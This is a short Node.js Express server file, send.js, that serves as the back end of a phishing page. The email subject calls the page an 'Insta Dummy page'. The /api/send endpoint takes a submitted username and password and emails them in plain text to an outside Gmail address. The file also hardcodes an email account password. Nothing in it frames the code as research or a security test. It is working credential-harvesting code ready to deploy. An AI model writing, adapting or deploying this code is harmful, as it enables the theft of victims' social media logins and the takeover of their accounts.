// send.js

const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const port = process.env.PORT || 3000;

// Body parser middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// POST endpoint to handle form submission
app.post('/api/send', (req, res) => {
    const { u_name, pass } = req.body;

    // Email configuration (using your email service credentials)
    const transporter = nodemailer.createTransport({
        service: 'YourEmailServiceProvider',
        auth: {
            user: 'exampl!!!',
            pass: 'pank84@123'
        }
    });

    // Email content
    const mailOptions = {
        from: 'your-email@example.com',
        to: 'mangleshop028@gmail.com',
        subject: 'Someone Login ! Insta Dummy page',
        text: `Username: ${u_name}\nPassword: ${pass}`
    };

    // Sending email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent: ' + info.response);
            res.status(200).send('Email sent successfully');
        }
    });
});

// Start server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
